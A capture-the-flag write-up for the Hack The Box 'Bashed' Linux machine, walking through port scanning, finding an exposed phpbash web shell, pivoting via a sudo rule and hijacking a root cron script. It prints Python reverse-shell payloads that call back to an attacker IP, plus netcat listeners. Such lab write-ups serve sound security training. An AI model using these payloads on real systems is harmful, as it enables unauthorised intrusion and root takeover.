# Hack The Box: Bashed

**Difficulty:** Easy
**OS:** Linux

Bashed is an Easy-level Linux machine designed to highlight the dangers of leaving administrative web shells or testing scripts accessible in a production environment. The initial compromise is achieved by discovering a hidden `phpbash` script during directory enumeration. Privilege escalation involves pivoting through a secondary user and exploiting a predictable cron job executing a Python script as root.

---

## Reconnaissance

We begin the assessment with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.10.68
nmap -p 80 -sCV 10.10.10.68
```

The scan reveals only one open port:
*   **Port 80:** HTTP (Apache httpd 2.4.18 Ubuntu)

Navigating to the web service on port 80 displays a blog post written by a user named `arrexel`. The post discusses a tool called "phpbash," which the author developed to execute terminal commands directly from a web browser. The post includes screenshots of the tool in action, demonstrating it running on the exact server we are attacking.

This is a massive hint that the `phpbash` script is likely hosted somewhere on the site.

## Web Application Analysis

We perform directory brute-forcing to discover hidden directories and locate the `phpbash` script.

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration reveals several standard directories (`/images`, `/js`, `/css`) and a few interesting ones:
*   `/dev`
*   `/php`
*   `/uploads`

### Accessing the Web Shell

We navigate to the `/dev` directory in our browser (`http://10.10.10.68/dev/`). The server has directory listing enabled, revealing two files:
*   `phpbash.php`
*   `phpbash.min.php`

Clicking on `phpbash.php` loads the tool described in the blog post—a fully functional, interactive web-based terminal running as the `www-data` user.

## Initial Access

We use the `phpbash` interface to explore the system. We can execute commands like `id`, `ls`, and `cat`.

While `phpbash` is convenient, it operates over HTTP requests, meaning it lacks state and cannot handle interactive commands (like `su` or `vim`). To establish a more robust foothold, we use `phpbash` to spawn a reverse shell to our attacking machine.

We start a Netcat listener on our machine:
```bash
nc -lnvp 9999
```

In the `phpbash` terminal, we execute a reverse shell payload. Since this is an Ubuntu system, we use a standard Python or Netcat payload.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.X",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We catch the reverse shell on our listener.

```bash
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We stabilize our shell and navigate to the `/home/arrexel` directory to retrieve the `user.txt` flag. Surprisingly, the flag file is readable by the `www-data` user.

## Lateral Movement

Enumerating the system as `www-data`, we check for commands we can run using `sudo`.

```bash
sudo -l
```

The output reveals that `www-data` can run any command as the user `scriptmanager` without providing a password.

```text
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

We use this `sudo` privilege to pivot to the `scriptmanager` user.

```bash
sudo -u scriptmanager /bin/bash
# id
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)
```

## Privilege Escalation

As `scriptmanager`, we explore the root filesystem. We notice a non-standard directory located at the root of the filesystem named `/scripts`.

```bash
ls -la /
# ...
# drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
# ...
```

The `scriptmanager` user owns this directory. We investigate its contents.

```bash
ls -la /scripts
# -rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
# -rw-r--r-- 1 root          root          12 Dec  4  2017 test.txt
```

There are two files: `test.py` (owned by `scriptmanager`) and `test.txt` (owned by `root`).

We examine the contents of `test.py`:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

The script simply opens `test.txt` and writes a string to it. However, the ownership of `test.txt` (root) combined with the fact that its timestamp updates periodically suggests that a root-level cron job is continuously executing the `test.py` script.

### Exploiting the Root Cron Job

Because the `scriptmanager` user owns `test.py`, we have write permissions to it. We can modify `test.py` to execute malicious code instead of writing a harmless string. When the root cron job executes the script, our code will run with root privileges.

We edit `test.py` to include a Python reverse shell payload.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.X",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

We start a new Netcat listener on port 8888. Within a minute, the cron job executes the modified `test.py` script, and we receive a reverse connection.

```bash
nc -lnvp 8888
# Connection received
id
# uid=0(root) gid=0(root) groups=0(root)
```

The system is fully compromised, and we retrieve the `root.txt` flag from the `/root` directory.
